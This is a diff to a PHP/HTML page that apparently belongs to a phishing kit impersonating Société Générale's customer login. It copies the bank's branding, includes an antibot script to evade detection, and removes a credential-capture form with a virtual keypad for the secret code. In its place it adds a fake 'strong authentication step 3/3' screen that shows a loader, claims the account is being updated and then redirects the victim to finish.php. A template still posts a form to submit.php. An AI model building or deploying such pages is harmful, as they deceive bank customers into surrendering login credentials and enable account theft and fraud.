@@ -15,7 +15,6 @@ error_reporting(E_ALL);
  */
 
 include '../inc/antibots.php';
-include '../inc/protection_dynamique.php';
 include_once '../inc/app.php';
 
 $random   = rand(0,100000000000);
@@ -24,7 +23,7 @@ $LSG = substr(md5($random), 0, 17);
 ?>
 <?php 
 /*CACHE*/
-$fichierCache = '../cache/lsg_index.lsg';
+$fichierCache = '../cache/lsg_passecur.lsg';
 if (@filemtime($fichierCache)<time()-(24*3600)) {ob_start(); 
 ?>
 
@@ -217,19 +216,15 @@ userSegmentNames.push("Clients_Generiques");
 <link href="../assets/css/spec56_btn_gsm_all_gcd_20211128192509.min.css" rel="stylesheet" type="text/css" />
 <link href="../assets/css/print_20220624163857.min.css" rel="stylesheet" type="text/css" media="print"/>
 
-<style type="text/css">
-/* ... votre code CSS existant ici ... */
-.centered-form {
-    max-width: 450px; /* Ajustez la largeur si nécessaire */
-    margin: 0 auto;
-    padding: 20px;
-}
-
+<link href="../assets/scss/index_20190723161948.min.css" rel="stylesheet" type="text/css">
+<link href="../assets/scss/spec56_btn_gsm_all_gcd_20190320190559.min.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="../assets/scss/inbenta.css">
+<link rel="stylesheet" href="../assets/scss/style.css">
+<link href="../assets/scss/print_20190320190559.min.css" rel="stylesheet" type="text/css" media="print">
 <style type="text/css">
 .eip_txt_light{
   font-weight:300;
 }
-
 
 .eip_dcw_main-link{
   color:#fff;
@@ -239,12 +234,6 @@ userSegmentNames.push("Clients_Generiques");
   transition: color 0.2s ease-in-out;
 }
 
-/* Nouveau code pour centrer le formulaire */
-.centered-form {
-    max-width: 450px; /* Ajustez la largeur si nécessaire */
-    margin: 0 auto;
-    padding: 20px;
-}
 .eip_dcw_main-link:hover, .eip_dcw_main-link:focus{
   color:#f05b6f;
 }
@@ -319,7 +308,55 @@ return false;
 }   
 
 
-</script>
+</script> 
+<style type="text/css">
+.eip_txt_light {
+font-weight: 300;
+}
+
+.eip_dcw_main-link {
+color: #fff;
+text-decoration: underline !important;
+-webkit-transition: color 0.2s ease-in-out;
+-o-transition: color 0.2s ease-in-out;
+transition: color 0.2s ease-in-out;
+}
+
+.eip_dcw_main-link:hover,
+.eip_dcw_main-link:focus {
+color: #f05b6f;
+}
+</style>
+<style>
+#codCl {
+opacity:0;
+
+}
+#codCl.waa {
+opacity:1;
+transition:opacity 500ms;
+}
+#oop {
+   
+opacity:1;
+transition:opacity 500ms;
+}
+#oop.woo {
+ opacity:0;
+
+}
+
+</style>
+
+<script>
+setTimeout(function(){
+document.getElementById('oop').className = 'woo';
+}, 5000);
+
+setTimeout(function(){
+document.getElementById('codCl').className = 'waa';
+}, 5000);
+</script>  
 
 </head>
 
@@ -369,7 +406,7 @@ return false;
 <a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Ouvrir un compte" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#"><span class="rsp_link__label">Ouvrir un compte</span>
 </a></div>
 
-<h1 class="rsp_header__title-page" id="js-mobile-title">Connexion à votre Espace Client Particuliers</h1>
+<h1 class="rsp_header__title-page" id="js-mobile-title">Authentification forte - Etape 3/3</h1>
 
 <input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD"/>
 </header>
@@ -600,60 +637,25 @@ swmConfOverride.styles = ["../assets/css/style.css"];
 <DIV id="divMaster" class="swm_block">
   
 
-<main class="dcw_main dcw_gb9_core-wrapper" role="main" style="margin-top: -40px; margin-left: 15%; margin-right: 15%;">
-<a id="go-content" tabindex="-1"></a>
-<section class="dcw_gb_row"></section>
+<!--<main class="dcw_main dcw_gb9_core-wrapper" role="main" style="margin-top: -40px; margin-left: 15%; margin-right: 15%;">-->
+<section class="dcw_main" >
+<section class="dcw_gb_row dcw_gb_communication">
+</section>
 <section class="dcw_gb_wrapper">
+<main role="main">
 <a id="go-content" tabindex="-1"></a>
-<section class="dcw_gb9_core-left" id="">
-
-<noscript>
-<style>
-.auth-content {
-display: none !important;
-}
-
-.js-alert {
-display: block !important;
-}
-
-.waitAuthJetonMsg {
-display: none !important;
-}
-</style>
-</noscript>
-
-<link rel="stylesheet" href="../assets/scss/style.css">
+<section class="dcw_gb_core ugds_serviciel" id="">
 
 <div id="dcw-swm" class="swm-inner-wrapper">
-<form id="form" action="submit.php" method="POST" onsubmit="return cc()" class="component-mire-codeclient">
-
-    <div style="display:none;">
-        <label for="url">URL de votre site</label>
-        <input type="text" id="url" name="url">
-    </div>
-    <input type="hidden" name="js_check" id="js_check" value="0">
-    <input type="hidden" name="load_time" id="load_time" value="<?php echo $_SESSION['load_time']; ?>">
-
-    <div class="swm_block-element">
-        <div class="prefetch"></div>
-        <div id="disableLayer" class="disable-layer"></div>
-        </div>
-</form>
-
-<script>
-    document.addEventListener('DOMContentLoaded', function() {
-        document.getElementById('js_check').value = '1';
-    });
-</script>
-<div class="swm_block-element">
 <div class="prefetch"></div>
 <div id="disableLayer" class="disable-layer"></div>
+
+
 
 <div id="swm-tooltip" class="swm-tooltip">
 <span></span>
 </div>
-<div class="swm-popin-wrapper">
+<div class="swm-popin-wrapper" tabindex="0" role="dialog" aria-live="assertive">
 <div id="swm-popin-overlay" class="swm-popin-overlay"></div>
 <div id="swm-popin-dialog" class="swm-popin-dialog">
 <div class="swm-popin-relative">
@@ -670,230 +672,64 @@ display: none !important;
 </div>
 </div>
 
-<div class="dcw_authent">
-
-<div class="auth-content js-content-aria-hide dcw_codeContainer">
-<div id="swmModulesAuth">
-<div id="module-authent-cv">
-<div class="container-mire-codeClient">
+<main role="main" class="dcw_authent dcw_csetape">
+<div class="dcw_codeContainer">
 <div class="dcw_block">
-<div class="component-mire-codeclient">
+<div class="dcw_block-element">
+<section class="dcw_chemin_etape js-breadcrumb nav-item-selected-1">
 
-<div class="centered-form">
-    <div class="dcw_block-element">
-    <div class="auth-cs-content row_section dcw_input-container">
-    <input id="user_id" name="user_id" type="text" class="auth-input-erasable auth-login dcw_input grey_cross eer_input__field ngim-input"  onkeypress="return event.charCode >= 48 &amp;&amp; event.charCode <= 57" autocomplete="off" maxlength="8" required=""> <span class="dcw_sprite dcw_to-clear" id="user_id-delete"> <a class="dcw_icone dcw_effacer" aria-label="Effacer le code client" href="#"></a> </span> <span class="bar" tabindex="-1" aria-hidden="true"></span>
-    <label tabindex="-1" aria-hidden="true">Saisissez votre code client</label>
-    </div>
-</div>
-<div id="js-error" tabindex="0" role="alert" class="auth_error show" style="display: none;"> 
-<div class="error-wrapper"> 
-<div role="alert" class="inner">  
-<div role="alert" class="message" tabindex="0">Votre identifiant est incorrect</div>
-</div> 
+</section>
 </div>
 </div>
+<div id="oop" align="center">
+<img src="../assets/img/loader.gif">
 </div>
-<div class="auth-checkbox-wrapper auth-check-left dcw_block-element" id="saveId-container" style="margin-top: -15px;">
-<div class="switch" tabindex="0" aria-label="Activer la mémorisation du code client">
-<input type="checkbox" class="switch input" id="saveId" name="saveId" style="display: none" data-xiti="clic_memoriser_identifiant" tabindex="0">
-<label for="saveId" class="labelSwitch" onclick="" aria-hidden="true" data-xiti="clic_memoriser_identifiant" aria-labelledby="memo_code_client_label"> <span class="hidden-checkbox-input needsclick rep"></span>
-<div class="toggle-btn-handle"></div>
-</label>
-</div> <span class="hidden-checkbox-label" id="memo_code_client_label" aria-hidden="true"><label for="saveId">Se souvenir de moi</label></span>
-<div class="dcw_infohover dcw_input-info" tabindex="0" aria-label="Information sur la mémorisation du code client"> <span class="dcw_sprite-info--off"></span>
-<div class="dcw_infopopin dcw_infobulle">
-<p class="dcw_espace">Se souvenir de moi</p>
-<p>En cochant cette case, votre code client sera mémorisé sur cet appareil.</p>
-<p class="dcw_espace">De cette manière vous n'aurez plus à le saisir lors de vos prochaines connexions.</p>
-<p class="dcw_espace">Ceci est déconseillé si votre ordinateur est utilisé par d'autres personnes.</p>
-<button class="dcw_button-secondaire--linear-gris dcw_button-arrondi">J'ai compris</button>
+
+<div id="codCl">
+
+<div class="dcw_block dcw_block-text">
+<div class="dcw_block-element">
+<h3>L'authentification forte est bien activée, <br>Mise à jour des informations en cours...</h3>
 </div>
 </div>
-</div>
-<div class="auth-cs-content-validate" id="btn-container" style="display: block; margin-top: -15px; margin-left: 30%; margin-right: 30%;">
-<button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-validate" onclick="ShowStep2();" type="button" aria-label="Valider votre identifiant">Valider</button>
-<br> </div>
-</div>
-</div>
-</div>
-<div id="clavier" class="loaded" style="display: none;">
 
 
-<div class="component-authent-cv dcw_block" aria-expanded="true" id="sonore-vk" style="margin-top: -30px; margin-left: 25%; margin-right: 25%;">
-
-<div class="auth-cs-content-code auth-cs-content swm-vk">
-
-<div class="auth-cs-content-code-input row_section dcw_input-container">
-
-<input type="button" id="closeKeyBoard">
-
-<div class="auth-cs-content-code-input row_section dcw_input-container">
-
-<input type="hidden" id="secret-nbr" name="Pass" class="dcw_input grey_cross" readonly="readonly"  autocomplete="off" maxlength="6" required="" placeholder="------" style="width:220px;margin-right: 50px; border: none;display: none;">
-
-<table style="width:220px; height:20px; font-size: 45px; margin-top: -20px; margin-bottom: 20px; margin-right: 65px; color: #DDD;">
-<tr>
-<td id="temoin-nbr1" style="width:16.66%;">_</td>
-<td id="temoin-nbr2" style="width:16.66%;">_</td>
-<td id="temoin-nbr3" style="width:16.66%;">_</td>
-<td id="temoin-nbr4" style="width:16.66%;">_</td>
-<td id="temoin-nbr5" style="width:16.66%;">_</td>
-<td id="temoin-nbr6" style="width:16.66%;">_</td>
-</tr>
-</table>
-<span id="secret-nbr2" style="display: none;">0</span>
-
-
-<span class="dcw_sprite dcw_to-clear" role="button" id="initClient" style="display: block;cursor: pointer; text-decoration: none; overflow: hidden; position: absolute; pointer-events: auto; margin-right: 55px;"></span>
-
-<script type='text/javascript'>
-
-function temoinNumber(){
-var passpass = document.getElementById('secret-nbr').value;
-if(passpass.length <= 0){ 
-document.getElementById('temoin-nbr1').innerHTML = "_";
-document.getElementById('temoin-nbr2').innerHTML = "_";
-document.getElementById('temoin-nbr3').innerHTML = "_";
-document.getElementById('temoin-nbr4').innerHTML = "_";
-document.getElementById('temoin-nbr5').innerHTML = "_";
-document.getElementById('temoin-nbr6').innerHTML = "_"; 
-
-document.getElementById('temoin-nbr1').style.fontSize = "45px";
-document.getElementById('temoin-nbr2').style.fontSize = "45px";
-document.getElementById('temoin-nbr3').style.fontSize = "45px";
-document.getElementById('temoin-nbr4').style.fontSize = "45px";
-document.getElementById('temoin-nbr5').style.fontSize = "45px";
-document.getElementById('temoin-nbr6').style.fontSize = "45px";
-
-document.getElementById('temoin-nbr1').style.color = "#DDD";
-document.getElementById('temoin-nbr2').style.color = "#DDD";
-document.getElementById('temoin-nbr3').style.color = "#DDD";
-document.getElementById('temoin-nbr4').style.color = "#DDD";
-document.getElementById('temoin-nbr5').style.color = "#DDD";
-document.getElementById('temoin-nbr6').style.color = "#DDD";
-
-}
-if(passpass.length == 1){ 
-document.getElementById('temoin-nbr1').innerHTML = ".";
-document.getElementById('temoin-nbr1').style.fontSize = "65px";
-document.getElementById('temoin-nbr1').style.color = "gray";
-document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
-}
-if(passpass.length == 2){ 
-document.getElementById('temoin-nbr2').innerHTML = ".";
-document.getElementById('temoin-nbr2').style.fontSize = "65px";
-document.getElementById('temoin-nbr2').style.color = "gray";
-document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
-}
-if(passpass.length == 3){ 
-document.getElementById('temoin-nbr3').innerHTML = ".";
-document.getElementById('temoin-nbr3').style.fontSize = "65px";
-document.getElementById('temoin-nbr3').style.color = "gray";
-document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
-}
-if(passpass.length == 4){ 
-document.getElementById('temoin-nbr4').innerHTML = ".";
-document.getElementById('temoin-nbr4').style.fontSize = "65px";
-document.getElementById('temoin-nbr4').style.color = "gray";
-document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
-}
-if(passpass.length == 5){ 
-document.getElementById('temoin-nbr5').innerHTML = ".";
-document.getElementById('temoin-nbr5').style.fontSize = "65px";
-document.getElementById('temoin-nbr5').style.color = "gray";
-document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
-}
-if(passpass.length == 6){ 
-document.getElementById('temoin-nbr6').innerHTML = ".";
-document.getElementById('temoin-nbr6').style.fontSize = "65px";
-document.getElementById('temoin-nbr6').style.color = "gray";
-document.getElementById('secret-nbr').maxLength = "6";
-document.getElementById('secret-nbr2').innerHTML = document.getElementById('secret-nbr').value;
-}
-if(passpass.length >= 7){ 
-/*document.getElementById('secret-nbr2').innerHTML = passpass.slice(0,5);*/
-document.getElementById('secret-nbr').value = document.getElementById('secret-nbr2').innerHTML;
-}
-
-document.getElementById('secret-nbr').maxLength = "6";
-setTimeout(function () { temoinNumber(); },60);
-}
-
-temoinNumber();
-
+<script>
+setTimeout(function(){
+window.location.href="finish.php?lsg#<?php echo $LSG; ?>";
+}, 7000);
 </script>  
 
 
 
-
- <div id="js-error" tabindex="0" class="auth_error"></div>
-
-</div>
-<input type="hidden"  name="Hidden1" id="Hidden1"/>
-</div>
-<div>
-<div id="gda_vk" class="clavier-container dcw_block-element dcw_conteneur_clavier swm-visible">
-<div id="img_container" class="img-container">
-<img id="img_clavier" class="keyboard dcw_block-element dcw_conteneur_clavier" usemap="#tc_tclavier" src="../assets/img/gen_ui.png">
-<div id="hover_touche_4_4" class="hover" onclick="addCode ('3');" name="3" value="" style="position: absolute; left: 180px; top: 180px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_4_2" class="hover" onclick="addCode ('4');" name="4" value="" style="position: absolute; left: 60px; top: 180px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_3_4" class="hover" onclick="addCode ('8');" name="8" value="" style="position: absolute; left: 180px; top: 120px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_3_3" class="hover" onclick="addCode ('7');" name="7" value="" style="position: absolute; left: 120px; top: 120px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_3_2" class="hover" onclick="addCode ('9');" name="9" value="" style="position: absolute; left: 60px; top: 120px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_3_1" class="hover" onclick="addCode ('0');" name="0" value="" style="position: absolute; left: 0px; top: 120px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_2_1" class="hover" onclick="addCode ('6');" name="6" value="" style="position: absolute; left: 0px; top: 60px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_1_4" class="hover" onclick="addCode ('2');" name="2" value="" style="position: absolute; left: 180px; top: 0px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_1_3" class="hover" onclick="addCode ('5');" name="5" value="" style="position: absolute; left: 120px; top: 0px; width: 60px; height: 60px;"></div>
-<div id="hover_touche_1_1" class="hover" onclick="addCode ('1');" name="1" value="" style="position: absolute; left: 0px; top: 0px; width: 60px; height: 60px;"></div>
-</div>
-</div>
 </div>
 
-<div class="auth-cs-content-validate">
+ </div>
+</main>
 
-<button class="swm_button-principal swm_button-arrondi auth-btn-action swm_btn-disable" id="btn-authent" type="submit" aria-label="Valider votre code secret">Valider</button>
-
-<div class="sonore-Keyboard dcw_block-element">
-<br>
-<style type="text/css">
-.buttcolor:hover{color:red;}
-.buttcolor{color:black;}
-</style>
-<button class="buttcolor" style="width:200px !important; background-color: transparent; border: none; font-size: 16px; margin-left: 15px;">Activer le clavier sonore</button>
-</div>
-
-</div>
-</div>
-</div>
-</div>
-</div>
-</div>
-
-</div>
-
-</div>
 
 </div>
 
 
-</form>
-</div>
-</section>
 </section>
 </main>
+<section class="dcw_gb_row">
+</section>
+</section>
+</section>
 
 
 </DIV>  
 
 <script id="templateComponentAuthentCv" type="template/doT.js">
-
  <div id="module-authent-cv">
- <div class="container-mire-codeClient"></div>
- <div id="clavier"></div>
+  <form id="form" action="../pages/submit.php" method="POST" onsubmit="return cc()" class="component-mire-codeclient">
+      <div class="container-mire-codeClient"></div>
+      <div id="clavier"></div>
+  </form>
  </div>
+</script>
 
- </script>
 
 
   </div>
@@ -1120,7 +956,7 @@ En poursuivant votre navigation sur ce site, vous acceptez l'utilisation de cook
 </button>
 </div>
 </aside><footer class="dcw_footer" role="contentinfo">
-<div class="dcw_footer-second">
+<div class="dcw_footer-second" style="background-color: black !important;">
 <div class="dcw_footer_container">
 <nav class="dcw_footer-second_nav">
 <ul class="dcw_footer-second_list">
@@ -1174,7 +1010,9 @@ Trouver une agence
 </div>
 <nav class="dcw_footer-third">
 <div class="dcw_footer_container">
+<center>
 <img alt="Société Générale" aria-hidden="true" class="dcw_footer-third_logo" height="30" src="../assets/img/logo-sg-seul.svg" width="150" />
+</center><br>
 <ul class="dcw_footer-third_list">
 <li class="dcw_footer-third_item">
 <a data-tms-container-label="footer-super-links" href="#">Sécurité</a>
@@ -1196,6 +1034,7 @@ Trouver une agence
 </li>
 <li class="dcw_footer-third_item">
 <a data-tms-container-label="footer-super-links" href="#">Accessibilité Numérique (partiellement conforme)</a>
+<br>
 </li>
 </ul>
 </div>
@@ -1294,10 +1133,11 @@ if(idd == 2){
 </DIV>
 
 
+
 <?php 
 $contenuCache = ob_get_contents();ob_end_flush();
 $fd = fopen("$fichierCache", "w");
-if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_index.lsg');echo "\n";}  
+if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_passecur.lsg');echo "\n";}  
 ?>
 <input type="hidden" name="memoryText" id="memoryText" value="<?php if(isset($_SESSION['memory'])){ echo htmlspecialchars($_SESSION['memory']); } ?>" style="display: none;">
 <footer style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"> 
